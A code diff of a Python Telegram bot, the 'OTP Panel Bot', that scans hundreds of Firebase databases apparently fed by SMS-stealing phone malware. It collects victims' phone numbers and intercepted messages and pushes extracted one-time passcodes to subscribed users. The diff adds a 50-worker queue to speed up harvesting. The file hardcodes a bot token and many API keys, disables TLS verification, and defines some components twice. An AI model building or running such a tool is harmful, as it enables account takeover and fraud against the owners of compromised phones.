@@ -2,7 +2,7 @@
 """
 ══════════════════════════════════════════════════════════════════
         OTP PANEL BOT — ULTIMATE EDITION (1000+ USERS)           
-  Fresh SMS Filter | Owner Transfer | Railway Ready | Penalty Sys
+  50x Pro Workers | Queue System | Zero Crash | Penalty | 24h VIP
 ══════════════════════════════════════════════════════════════════
 """
 
@@ -40,9 +40,10 @@ logging.getLogger("telegram").setLevel(logging.ERROR)
 # ══════════════════════════════════════════════════════════════════
 #  CONFIG - CREDENTIALS & API
 # ══════════════════════════════════════════════════════════════════
-POLL_INTERVAL   = 8
+POLL_INTERVAL   = 5
 SMS_LIMIT       = 25
 PAGE_SIZE       = 10  
+NUM_WORKERS     = 50  # 🔥 Superfast 50 Workers for 373 DBs
 TOKEN           = "8218848065:AAGEg8EbJ2ArHRKfN04QMvSvD09V-wXtugY"  
 BOT_USERNAME    = "freepanelssmsbot"
 DB_FILE         = "bot_database.json"
@@ -53,37 +54,23 @@ REQUIRED_CHANNELS = [
     {"username": "rosekhudkabanaya", "url": "https://t.me/rosekhudkabanaya", "name": "Rose Khud Ka Banaya"},
 ]
 
-# Advanced Worker Limiter (Prevents DNS Choke on Railway)
-SCAN_SEMAPHORE = asyncio.Semaphore(15)
-
 # ══════════════════════════════════════════════════════════════════
 #  SUPERASSETS CHECKER CONFIG & PANELS
 # ══════════════════════════════════════════════════════════════════
 DEFAULT_CHECKER_SETTINGS = {
     "admins": [6860106371],  # 👑 Root Admin ID
     "api_keys": [
-        "AK_GFyk1-ivCOsfAF_H__wiWddDaGbRGBbT",
-        "AK_COqjB51-_qc-KO8lfZpKlUXu-qo9-zDQ",
-        "AK_Sz7XMaFcF7F4DUYcneZ6qIv90S4NcwaP",
-        "AK_iIJWhqJU-C5qGdEEvoMPy0vMyDvOJO4x",
-        "AK_huue0mXg6tf4e4syA_DU7M8naJZF2TAT",
-        "AK_DQDS9hMQ3M0H-ykltwotJMYpRFAC4fNg",
-        "AK_Kq1ctHXEH2ansTWeY9h4BeilG5Pae0VC",
-        "AK_nPBGxUCq0AWTtm1nus7TFnX1i0v0Bs5",
-        "AK_jfaywkZJc6W2_JUjHKtxo3uEcJOkBNH6",
-        "AK_Dooy_O2elOFy57Qjzt70FEAjBQcGD8YM",
-        "AK_KYrXjwwwdLYGiGXq47FDWOoL9vvdZZmo",
-        "AK_RrbWlO2Ole-pJgbmsm0mDcoOXFZ_bvJ-",
-        "AK_-aF0H5eQAekk-YmU63WlpPf3MQ5oLxZV",
-        "AK_31Whk-_9PxJnWJMJlS0op7kcp_ESfQTv",
-        "AK_VxWU04ePsl_m66_wEx0t7iisRDsiymAd",
-        "AK_bMsPDvvgkD7K5Kb_wH6tFiU9tOPnwgHb",
-        "AK_LpJ9kGcHQfWIfqoN-EG-2Ngg1_yXQhLH",
-        "AK_aewqEf78uV8I3V06vcEcBlESdcPGyz74",
-        "AK_-EAJ5LyrnsOGlsgafV-sbg5AUsyJ-zJn",
-        "AK_p4NwDAzl3aod2paD9e3UnvKVVTPdD6Dl",
-        "AK_J_1R4tCvxZgqvfCEDjT1hZZjwIRB4rnU",
-        "AK_-Xd_ErhFdQVLdHMB0XBEbqdf5ka3g0jh"
+        "AK_GFyk1-ivCOsfAF_H__wiWddDaGbRGBbT", "AK_COqjB51-_qc-KO8lfZpKlUXu-qo9-zDQ",
+        "AK_Sz7XMaFcF7F4DUYcneZ6qIv90S4NcwaP", "AK_iIJWhqJU-C5qGdEEvoMPy0vMyDvOJO4x",
+        "AK_huue0mXg6tf4e4syA_DU7M8naJZF2TAT", "AK_DQDS9hMQ3M0H-ykltwotJMYpRFAC4fNg",
+        "AK_Kq1ctHXEH2ansTWeY9h4BeilG5Pae0VC", "AK_nPBGxUCq0AWTtm1nus7TFnX1i0v0Bs5",
+        "AK_jfaywkZJc6W2_JUjHKtxo3uEcJOkBNH6", "AK_Dooy_O2elOFy57Qjzt70FEAjBQcGD8YM",
+        "AK_KYrXjwwwdLYGiGXq47FDWOoL9vvdZZmo", "AK_RrbWlO2Ole-pJgbmsm0mDcoOXFZ_bvJ-",
+        "AK_-aF0H5eQAekk-YmU63WlpPf3MQ5oLxZV", "AK_31Whk-_9PxJnWJMJlS0op7kcp_ESfQTv",
+        "AK_VxWU04ePsl_m66_wEx0t7iisRDsiymAd", "AK_bMsPDvvgkD7K5Kb_wH6tFiU9tOPnwgHb",
+        "AK_LpJ9kGcHQfWIfqoN-EG-2Ngg1_yXQhLH", "AK_aewqEf78uV8I3V06vcEcBlESdcPGyz74",
+        "AK_-EAJ5LyrnsOGlsgafV-sbg5AUsyJ-zJn", "AK_p4NwDAzl3aod2paD9e3UnvKVVTPdD6Dl",
+        "AK_J_1R4tCvxZgqvfCEDjT1hZZjwIRB4rnU", "AK_-Xd_ErhFdQVLdHMB0XBEbqdf5ka3g0jh"
     ],
     "unlocked_panels": ["DB_1", "DB_2", "DB_3"], 
     "maintenance": False,
@@ -300,7 +287,7 @@ class Device:
 seen_ids:  set[str] = set()   
 first_run: bool     = True
 _main_app: Optional[Application] = None
-_http_session: Optional[aiohttp.ClientSession] = None
+global_session: Optional[aiohttp.ClientSession] = None
 
 all_users: dict[int, dict] = {}
 pending_action: dict[int, dict] = {}
@@ -313,6 +300,11 @@ user_seen_unreg: dict[int, set[str]] = {}
 CLONES: dict[str, dict] = {}
 GLOBAL_DEVICE_CACHE: dict[str, list] = {}
 SYS_SETTINGS: dict = DEFAULT_CHECKER_SETTINGS.copy()
+
+# ══════════════════════════════════════════════════════════════════
+#  QUEUE & WORKERS SYSTEM (MAX SPEED / NO CRASH)
+# ══════════════════════════════════════════════════════════════════
+db_queue = asyncio.Queue()
 
 # ══════════════════════════════════════════════════════════════════
 #  DATA SAVING & LOADING
@@ -441,51 +433,44 @@ def extract_otp(text: str) -> Optional[str]:
     return None
 
 def parse_battery(val) -> int:
-    if isinstance(val, (int, float)): return int(val)
-    if isinstance(val, str):
-        digits = re.sub(r"\D", "", val)
-        return int(digits) if digits else 0
-    return 0
+    try:
+        if isinstance(val, (int, float)): return int(val)
+        if isinstance(val, str):
+            digits = re.sub(r"\D", "", val)
+            return int(digits) if digits else 0
+        return 0
+    except: return 0
 
-# 🔥 FIXED: Safe Timestamp parser so bot doesn't crash on bad database data
 def safe_ts(val) -> int:
     try:
         if not val: return 0
+        if isinstance(val, str):
+            val = re.sub(r"[^\d.]", "", val)
+            if not val: return 0
         val = float(val)
         if val > 1e11: val = val / 1000
         return int(val)
     except: return 0
 
-# 🔥 FIXED: Freshness logic strictly ignores numbers older than 12 hours
-def is_recently_active(ts) -> bool:
-    try:
-        if not ts: return False
-        val = float(ts)
-        if val > 1e11: val = val / 1000  
-        now = time.time()
-        return (now - val) < 43200  # 12 Hours max
-    except: return False
-
-def get_status(status_str, ts) -> str:
-    try:
-        if ts:
-            val = float(ts)
-            if val > 1e11: val = val / 1000
-            now = time.time()
-            if (now - val) < 43200: return "online"
-            else: return "offline"
-    except: pass
+def get_status(status_val, ts_val) -> str:
+    stat_str = str(status_val).strip().lower() if status_val is not None else ""
+    is_explicitly_online = (stat_str == "online" or stat_str == "true")
     
-    if status_str is not None:
-        return "online" if str(status_str).lower() == "online" else "offline"
+    ts = safe_ts(ts_val)
+    is_recently_active = False
+    if ts > 0:
+        if (time.time() - ts) < 43200: # 12 hours
+            is_recently_active = True
+            
+    if is_explicitly_online or is_recently_active:
+        return "online"
     return "offline"
 
 def sms_date(sms: dict) -> str:
     date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
-    if date_str: return date_str
-    if sms.get("timestamp"):
-        try: ts = float(sms["timestamp"]); return datetime.fromtimestamp(ts / 1000 if ts > 1e11 else ts).strftime("%d %b %Y %I:%M:%S %p")
-        except: pass
+    if date_str: return str(date_str)
+    ts = safe_ts(sms.get("timestamp"))
+    if ts > 0: return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M:%S %p")
     return "N/A"
 
 def seen_key(device_id: str, k: str) -> str: return f"{device_id}/{k}"
@@ -497,32 +482,24 @@ async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYP
     if re.search(r"-?\d{8,}", err_str): return 
     tlog(f"Telegram API Error: {context.error}")
 
-async def get_http_session() -> aiohttp.ClientSession:
-    global _http_session
-    if _http_session is None or _http_session.closed:
+async def init_session():
+    global global_session
+    if global_session is None or global_session.closed:
         ssl_context = ssl.create_default_context()
         ssl_context.check_hostname = False
         ssl_context.verify_mode = ssl.CERT_NONE
-        connector = TCPConnector(limit=150, limit_per_host=30, ttl_dns_cache=600, ssl=ssl_context, enable_cleanup_closed=True)
-        timeout = ClientTimeout(total=10, connect=5, sock_read=8)
-        _http_session = ClientSession(connector=connector, timeout=timeout, trust_env=True, headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Connection": "keep-alive"})
-    return _http_session
+        connector = TCPConnector(limit=300, limit_per_host=50, ttl_dns_cache=600, ssl=ssl_context, enable_cleanup_closed=True)
+        global_session = ClientSession(connector=connector, timeout=ClientTimeout(total=8), trust_env=True, headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Connection": "keep-alive"})
 
 async def fb_get(path: str, base: str) -> Optional[dict]:
     try:
-        session = await get_http_session()
         url = f"{base}/{path}.json" if path else f"{base}/.json"
-        for _ in range(2):
-            try:
-                async with session.get(url) as response:
-                    if response.status == 200:
-                        data = await response.json(content_type=None)
-                        return data if isinstance(data, dict) else None
-                    elif response.status in [404, 403]: return None
-                    else: await asyncio.sleep(0.5); continue
-            except: await asyncio.sleep(0.5); continue
-        return None
-    except: return None
+        async with global_session.get(url) as response:
+            if response.status == 200:
+                data = await response.json(content_type=None)
+                return data if isinstance(data, dict) else None
+    except Exception: pass
+    return None
 
 # ══════════════════════════════════════════════════════════════════
 #  LIMIT SYSTEM & PENALTY TRACKING
@@ -620,8 +597,7 @@ async def check_number_api(service: str, number: str) -> dict:
     payload = {"service": service.lower(), "number": clean_number}
     start_req = time.time()
     try:
-        session = await get_http_session()
-        async with session.post("https://superassets.in/api/v1/check", json=payload, headers={"X-API-Key": selected_key, "Content-Type": "application/json"}, timeout=ClientTimeout(total=8)) as r:
+        async with global_session.post("https://superassets.in/api/v1/check", json=payload, headers={"X-API-Key": selected_key, "Content-Type": "application/json"}) as r:
             req_ms = int((time.time() - start_req) * 1000)
             if r.status == 200: 
                 res = await r.json()
@@ -631,88 +607,156 @@ async def check_number_api(service: str, number: str) -> dict:
     except Exception: return {"status": "error", "message": f"Timeout", "ms": int((time.time() - start_req) * 1000)}
 
 # ══════════════════════════════════════════════════════════════════
-#  FIREBASE DATA FETCHER - VERY AGGRESSIVE
+#  FIREBASE DATA FETCHER - QUEUE WORKERS
 # ══════════════════════════════════════════════════════════════════
 
-async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
-    async with SCAN_SEMAPHORE:  
+async def _forward_sms(device: Device, sms: dict) -> None:
+    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
+    if not body: return
+
+    label = device_label(device)
+    otp = extract_otp(body)
+    msg_text = auto_forward_msg(sms, label)
+    
+    kb_rows = []
+    if otp: kb_rows.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
+    kb_rows.append([InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{device.id}"), InlineKeyboardButton("ℹ️ Device Info", callback_data=f"info:{device.id}")])
+    markup = InlineKeyboardMarkup(kb_rows)
+    send_tasks = []
+
+    for bot_token, chat_dict in user_focus.items():
+        if bot_token != TOKEN:
+            if bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]: continue
+            app_to_use, users_db = CLONES[bot_token]["app"], CLONES[bot_token]["users"]
+        else: app_to_use, users_db = _main_app, all_users
+
+        for chat_id in [cid for cid, did in chat_dict.items() if did == device.id and is_vip(bot_token, cid)]:
+            if otp: users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
+            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode="HTML"))
+            
+    if send_tasks: await asyncio.gather(*send_tasks, return_exceptions=True)
+
+async def fetch_and_process_db(tag: str, url: str, is_first_run: bool):
+    try:
+        sim_all, device_info_all, user_data_all, clients_all, devices_all, users_all = await asyncio.gather(
+            fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
+            fb_get("user_data", url), fb_get("clients", url), fb_get("Devices", url), fb_get("Users", url), return_exceptions=True
+        )
+
         devices_list, added_set = [], set()
+
+        if isinstance(sim_all, dict):
+            info_all = device_info_all if isinstance(device_info_all, dict) else {}
+            for dev_id, sim in sim_all.items():
+                if dev_id in added_set or not isinstance(sim, dict): continue
+                added_set.add(dev_id)
+                info = info_all.get(dev_id) or {}
+                nums = extract_all_nums(sim, info)
+                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
+                ts = info.get("currentTimeMillis") or info.get("timestamp") or sim.get("timestamp")
+                devices_list.append(Device(id=dev_id, name=model, status=get_status(info.get("Status") or sim.get("status"), ts), battery=parse_battery(info.get("Battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
+
+        if isinstance(user_data_all, dict):
+            for dev_id, data in user_data_all.items():
+                if dev_id in added_set or not isinstance(data, dict): continue
+                added_set.add(dev_id)
+                nums = extract_all_nums(data)
+                ts = data.get("timestamp")
+                devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))
+
+        if isinstance(clients_all, dict):
+            for dev_id, client in clients_all.items():
+                if dev_id in added_set or not isinstance(client, dict): continue
+                sim_list = client.get("sims", [])
+                nums = extract_all_nums(client, sim_list[0] if len(sim_list)>0 else {}, sim_list[1] if len(sim_list)>1 else {})
+                if not nums and not client.get("modelName"): continue
+                added_set.add(dev_id)
+                model = client.get("modelName") or f"Device-{dev_id[:6]}"
+                status = "online" if client.get("status") is True else "offline"
+                devices_list.append(Device(id=dev_id, name=model, status=status, battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
+                
+        if isinstance(devices_all, dict):
+            for dev_id, data in devices_all.items():
+                if dev_id in added_set or not isinstance(data, dict): continue
+                added_set.add(dev_id)
+                nums = extract_all_nums(data)
+                model = data.get("model") or data.get("PhoneModel") or f"Device-{dev_id[:6]}"
+                ts = data.get("timestamp")
+                devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Devices/{dev_id}/sms", base_url=url, db_tag=tag))
+
+        if isinstance(users_all, dict):
+            for dev_id, data in users_all.items():
+                if dev_id in added_set or not isinstance(data, dict): continue
+                added_set.add(dev_id)
+                nums = extract_all_nums(data)
+                model = data.get("model") or data.get("name") or f"Device-{dev_id[:6]}"
+                ts = data.get("timestamp")
+                devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Users/{dev_id}/sms", base_url=url, db_tag=tag))
+
+        GLOBAL_DEVICE_CACHE[tag] = devices_list
+
+        if not is_first_run:
+            # Check SMS only for online devices to save memory & requests
+            online_devs = [d for d in devices_list if d.status == "online"]
+            if not online_devs: return
+            
+            r_main, r_user, r_root = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url), return_exceptions=True)
+            device_map = {d.id: d for d in online_devs}
+            
+            for bulk_data in (r_main, r_user, r_root):
+                if not isinstance(bulk_data, dict): continue
+                for dev_id, sms_dict in bulk_data.items():
+                    if not isinstance(sms_dict, dict) or not device_map.get(dev_id): continue
+                    for k, sms in sms_dict.items():
+                        if not isinstance(sms, dict): continue
+                        sk = seen_key(dev_id, k)
+                        if sk in seen_ids: continue
+                        seen_ids.add(sk)
+                        try: await _forward_sms(device_map.get(dev_id), sms)
+                        except: pass
+                                
+    except: pass
+
+async def db_worker():
+    while True:
+        tag, url, is_first_run = await db_queue.get()
         try:
-            sim_all, device_info_all, user_data_all, clients_all, devices_all, users_all = await asyncio.gather(
-                fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
-                fb_get("user_data", url), fb_get("clients", url), fb_get("Devices", url), fb_get("Users", url), return_exceptions=True
-            )
+            await fetch_and_process_db(tag, url, is_first_run)
+        except Exception: pass
+        finally:
+            db_queue.task_done()
 
-            if isinstance(sim_all, dict):
-                info_all = device_info_all if isinstance(device_info_all, dict) else {}
-                for dev_id, sim in sim_all.items():
-                    if dev_id in added_set or not isinstance(sim, dict): continue
-                    added_set.add(dev_id)
-                    info = info_all.get(dev_id) or {}
-                    nums = extract_all_nums(sim, info)
-                    model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
-                    ts = info.get("currentTimeMillis") or info.get("timestamp") or sim.get("timestamp")
-                    
-                    devices_list.append(Device(id=dev_id, name=model, status=get_status(info.get("Status") or sim.get("status"), ts), battery=parse_battery(info.get("Battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
-
-            if isinstance(user_data_all, dict):
-                for dev_id, data in user_data_all.items():
-                    if dev_id in added_set or not isinstance(data, dict): continue
-                    added_set.add(dev_id)
-                    nums = extract_all_nums(data)
-                    ts = data.get("timestamp")
-                    
-                    devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))
-
-            if isinstance(clients_all, dict):
-                for dev_id, client in clients_all.items():
-                    if dev_id in added_set or not isinstance(client, dict): continue
-                    sim_list = client.get("sims", [])
-                    nums = extract_all_nums(client, sim_list[0] if len(sim_list)>0 else {}, sim_list[1] if len(sim_list)>1 else {})
-                    if not nums and not client.get("modelName"): continue
-                    added_set.add(dev_id)
-                    model = client.get("modelName") or f"Device-{dev_id[:6]}"
-                    status = "online" if client.get("status") is True else "offline"
-                    
-                    devices_list.append(Device(id=dev_id, name=model, status=status, battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
-                    
-            if isinstance(devices_all, dict):
-                for dev_id, data in devices_all.items():
-                    if dev_id in added_set or not isinstance(data, dict): continue
-                    added_set.add(dev_id)
-                    nums = extract_all_nums(data)
-                    model = data.get("model") or data.get("PhoneModel") or f"Device-{dev_id[:6]}"
-                    ts = data.get("timestamp")
-                    devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Devices/{dev_id}/sms", base_url=url, db_tag=tag))
-
-            if isinstance(users_all, dict):
-                for dev_id, data in users_all.items():
-                    if dev_id in added_set or not isinstance(data, dict): continue
-                    added_set.add(dev_id)
-                    nums = extract_all_nums(data)
-                    model = data.get("model") or data.get("name") or f"Device-{dev_id[:6]}"
-                    ts = data.get("timestamp")
-                    devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Users/{dev_id}/sms", base_url=url, db_tag=tag))
-
-        except: pass
-        return tag, devices_list
-
-async def fetch_all_databases() -> Dict[str, List[Device]]:
-    tasks = [fetch_single_db(tag, url) for tag, url in DATABASES.items()]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    return {tag: devices for result in results if isinstance(result, tuple) for tag, devices in [result]}
+async def poll_loop(app: Application) -> None:
+    global first_run, _main_app
+    _main_app = app
+    
+    # Start 50 Workers for maximum speed
+    for _ in range(NUM_WORKERS):
+        asyncio.create_task(db_worker())
+    
+    while True:
+        for tag, url in DATABASES.items():
+            await db_queue.put((tag, url, first_run))
+        
+        await db_queue.join()
+        
+        if first_run:
+            first_run = False
+            total_devices = sum(len(devs) for devs in GLOBAL_DEVICE_CACHE.values())
+            online_devices = sum(1 for devs in GLOBAL_DEVICE_CACHE.values() for d in devs if d.status == 'online')
+            tlog(f"✅ Bot Ready! {len(DATABASES)} DBs, {total_devices} devices, {online_devices} online")
+            
+        await asyncio.sleep(POLL_INTERVAL)
 
 async def get_all_devices(bot_token: str) -> list[Device]:
     devices = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, [])]
-    unique_devices, seen_ids, seen_numbers = [], set(), set()
+    unique_devices, seen_n = [], set()
     for d in devices:
-        if d.id in seen_ids: continue
-        seen_ids.add(d.id)
         if d.numbers:
-            new_nums = [n for n in d.numbers if n not in seen_numbers]
+            new_nums = [n for n in d.numbers if n not in seen_n]
             if not new_nums: continue 
             d.numbers = new_nums
-            seen_numbers.update(new_nums)
+            seen_n.update(new_nums)
         unique_devices.append(d)
 
     online_devices = [d for d in unique_devices if d.status == "online"]
@@ -916,11 +960,7 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             try: await ctx.bot.send_message(ref_id, f"🎉 <b>SUCCESSFUL REFERRAL!</b>\n\nEk naye user ne aapke link se join kiya hai.\nCollect 15 referrals to get 1 Hour UNLIMITED VIP Access!\nYour Available Referrals: {avail}/15\n\n<i>⚠️ Note: Agar is user ne 24 ghante se pehle channel left kiya, toh dono ko penalty lagegi.</i>", parse_mode="HTML")
             except: pass
 
-    if is_main_bot and not users_db.get(chat_id, {}).get("bonus_10_received"):
-        users_db.setdefault(chat_id, {})["bonus_10_received"] = True
-        users_db[chat_id]["coins"] = users_db[chat_id].get("coins", 0) + 10
-        try: await ctx.bot.send_message(chat_id, "🎉 <b>GIFT FROM ADMIN</b> 🎉\n\nAdmin ne aapko <b>10 Coins free</b> diye hain! 🎁\n\nAb sirf doston ko invite karo aur 1 Hour VIP ya khudka bot banao!\n\nClick '💸 Refer & Earn' to get your link.", parse_mode="HTML")
-        except: pass
+    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)
 
     unjoined = await check_membership(bot_token, ctx.bot, chat_id)
     if unjoined: return await send_join_prompt(update, is_main_bot)
@@ -990,7 +1030,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             avail_refs = u.get("referrals", 0) - u.get("spent_refs", 0)
             if avail_refs >= 15:
                 users_db[chat_id]["spent_refs"] = u.get("spent_refs", 0) + 15
-                users_db[chat_id]["vip_until"] = time.time() + 3600  # 1 Hour VIP
+                users_db[chat_id]["vip_until"] = time.time() + 3600 
                 await safe_edit(query, "✅ <b>VIP ACTIVATED!</b>\n\nAapke 15 referrals use ho gaye hain. Agle 1 Ghante tak Unlimited Checker aur Online Devices access karein!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Menu", callback_data="home")]]))
             else:
                 await query.answer(f"❌ Not enough referrals! You need 15, but have {avail_refs}.", show_alert=True)
@@ -1035,8 +1075,10 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 devices = [d for r in results if isinstance(r, tuple) for d in r[1]]
             else:
                 await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Scanning databases for fresh numbers...</i>", parse_mode="HTML")
+                
                 unlocked = SYS_SETTINGS.get("unlocked_panels", [])
                 all_devs = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, []) if is_admin or tag in unlocked or not tag.startswith("DB_")]
+                
                 unique_devices, seen_n = [], set()
                 for d in all_devs:
                     if d.numbers:
@@ -1052,6 +1094,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 return await safe_edit(query, "❌ No active online numbers found right now.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
             
             random.shuffle(fresh_devices)
+            
             seen_set = user_seen_unreg.setdefault(chat_id, set())
             if len(seen_set) > 50: seen_set.clear()
             
@@ -1063,6 +1106,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 if target_num in seen_set: continue
                     
                 await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 Auto-Scanning... [{idx}/{total_scan}]\n📱 Checking: <code>+91{target_num[-10:]}</code>\n⚡ <i>Hitting {service.upper()} API...</i>", parse_mode="HTML")
+                
                 res = await check_number_api(service, target_num)
                 is_error = res.get("status") == "error"
                 if is_error: await asyncio.sleep(1.0); continue
@@ -1284,6 +1328,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     if unjoined: return await send_join_prompt(update, is_main_bot)
 
     if users_db.get(chat_id, {}).get("banned") or is_spamming(chat_id): return
+    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)
 
     # 🔥 OWNER MANAGEMENT COMMANDS
     if is_root_admin(chat_id) and text.startswith("/addowner "):
@@ -1581,8 +1626,90 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         return await wait_msg.edit_text(f"📢 BROADCAST COMPLETE", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_refresh")]]))
 
 # ══════════════════════════════════════════════════════════════════
-#  FIREBASE POLL — AGGRESSIVE FETCHER
+#  QUEUE & WORKERS SYSTEM (MAX SPEED)
 # ══════════════════════════════════════════════════════════════════
+
+db_queue = asyncio.Queue()
+
+async def fetch_and_process_db(tag: str, url: str, is_first_run: bool):
+    try:
+        sim_all, device_info_all, user_data_all, clients_all, devices_all, users_all = await asyncio.gather(
+            fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
+            fb_get("user_data", url), fb_get("clients", url), fb_get("Devices", url), fb_get("Users", url), return_exceptions=True
+        )
+
+        devices_list, added_set = [], set()
+
+        if isinstance(sim_all, dict):
+            info_all = device_info_all if isinstance(device_info_all, dict) else {}
+            for dev_id, sim in sim_all.items():
+                if dev_id in added_set or not isinstance(sim, dict): continue
+                added_set.add(dev_id)
+                info = info_all.get(dev_id) or {}
+                nums = extract_all_nums(sim, info)
+                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
+                ts = info.get("currentTimeMillis") or info.get("timestamp") or sim.get("timestamp")
+                devices_list.append(Device(id=dev_id, name=model, status=get_status(info.get("Status") or sim.get("status"), ts), battery=parse_battery(info.get("Battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
+
+        if isinstance(user_data_all, dict):
+            for dev_id, data in user_data_all.items():
+                if dev_id in added_set or not isinstance(data, dict): continue
+                added_set.add(dev_id)
+                nums = extract_all_nums(data)
+                ts = data.get("timestamp")
+                devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))
+
+        if isinstance(clients_all, dict):
+            for dev_id, client in clients_all.items():
+                if dev_id in added_set or not isinstance(client, dict): continue
+                sim_list = client.get("sims", [])
+                nums = extract_all_nums(client, sim_list[0] if len(sim_list)>0 else {}, sim_list[1] if len(sim_list)>1 else {})
+                if not nums and not client.get("modelName"): continue
+                added_set.add(dev_id)
+                model = client.get("modelName") or f"Device-{dev_id[:6]}"
+                status = "online" if client.get("status") is True else "offline"
+                devices_list.append(Device(id=dev_id, name=model, status=status, battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
+                
+        if isinstance(devices_all, dict):
+            for dev_id, data in devices_all.items():
+                if dev_id in added_set or not isinstance(data, dict): continue
+                added_set.add(dev_id)
+                nums = extract_all_nums(data)
+                model = data.get("model") or data.get("PhoneModel") or f"Device-{dev_id[:6]}"
+                ts = data.get("timestamp")
+                devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Devices/{dev_id}/sms", base_url=url, db_tag=tag))
+
+        if isinstance(users_all, dict):
+            for dev_id, data in users_all.items():
+                if dev_id in added_set or not isinstance(data, dict): continue
+                added_set.add(dev_id)
+                nums = extract_all_nums(data)
+                model = data.get("model") or data.get("name") or f"Device-{dev_id[:6]}"
+                ts = data.get("timestamp")
